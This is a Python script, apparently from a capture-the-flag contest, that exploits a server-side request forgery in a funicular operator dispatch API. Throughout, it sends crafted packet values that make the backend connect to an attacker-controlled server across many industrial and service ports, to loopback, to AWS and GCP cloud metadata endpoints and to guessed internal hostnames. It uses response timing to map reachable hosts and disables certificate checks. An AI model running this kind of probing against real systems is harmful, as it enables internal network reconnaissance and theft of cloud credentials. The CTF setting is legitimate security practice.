#!/usr/bin/env python3
"""
probe26: SSRF port fan-out на наш srv-01 (204.168.133.116).
Цель: засечь tcpdump'ом любой исходящий коннект от backend funicular.
- Перебираем популярные порты (HTTP, Modbus 502, MQTT 1883, S7 102, OPC UA 4840, ...).
- Перебираем форматы host (IP, IP:port, IP/path, http://IP, plain).
- Каждый раз — серийный запрос, sleep 0.6s.
- Замеряем тайминг (4s = fast path, 14s = timeout).

После всех probes — `scripts/srv.sh 01 'cat /tmp/tcpdump.log; echo ---; cat /tmp/oob.log'`
"""
import json
import time
import urllib.request
import ssl
import socket

URL = "https://funicular-gm2cxozn.alfactf.ru/api/operator/dispatch"
HEADERS = {"Content-Type": "application/json", "User-Agent": "p26"}
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

OUR_IP = "204.168.133.116"
OUR_HOST = "srv-01"  # тестовое короткое имя, может быть резолвится через search

PORTS = [21, 22, 23, 25, 53, 80, 102, 443, 502, 1883, 3000, 4840, 5432, 6379, 8080, 8443, 8888, 9000, 9090, 9100, 9200, 11211]

def call(packet, op="plc-sync", workOrder="WO-17-04", terminal="OP-3"):
    body = json.dumps({"operation": op, "packet": packet, "workOrder": workOrder, "terminal": terminal}).encode()
    req = urllib.request.Request(URL, data=body, headers=HEADERS, method="POST")
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, context=CTX, timeout=20) as resp:
            data = resp.read().decode("utf-8", "replace")
            dt = time.time() - t0
            return resp.status, dt, data[:120]
    except urllib.error.HTTPError as e:
        dt = time.time() - t0
        return e.code, dt, e.read().decode("utf-8", "replace")[:120]
    except Exception as e:
        dt = time.time() - t0
        return None, dt, repr(e)[:120]

def main():
    cases = []
    # Порт-фан на наш IP, формат host:port
    for p in PORTS:
        cases.append(("port:%d" % p, "%s:%d" % (OUR_IP, p)))
    # Имя хоста (если backend читает через DNS suffix search — может тут что-то)
    cases.append(("plain-host-noport", "%s" % OUR_IP))
    cases.append(("plain-name-noport", OUR_HOST))
    cases.append(("plain-fqdn", OUR_HOST + ".alfactf.ru"))
    # localhost-варианты (это уже не ОБ, но тайминги интересны)
    cases.append(("loopback", "127.0.0.1"))
    cases.append(("loopback:8080", "127.0.0.1:8080"))
    cases.append(("zeroaddr", "0.0.0.0:8888"))
    cases.append(("ipv6-lo", "[::1]"))
    # Cloud metadata
    cases.append(("aws-imds", "169.254.169.254"))
    cases.append(("gcp-imds", "metadata.google.internal"))
    # Internal hostnames (тайминговый оракул)
    for n in ["plc", "plc-gateway", "backup", "internal", "db", "redis", "operator-api"]:
        cases.append(("internal:" + n, n))

    print(f"# Cases: {len(cases)}, sleep 0.6s, total ~ {len(cases) * (4 + 0.6):.0f}s (best) / {len(cases) * (14 + 0.6):.0f}s (worst)")
    fast = []
    for label, packet in cases:
        st, dt, body = call(packet)
        flag = " <FAST>" if dt < 6 else ""
        print(f"[{st}] {dt:5.2f}s {label:30s} packet={packet!r}{flag}")
        if dt < 6:
            fast.append((label, packet, dt, body))
        time.sleep(0.6)

    print("\n# FAST PATHS (sub-6s):")
    for f in fast:
        print(f)

if __name__ == "__main__":
    main()
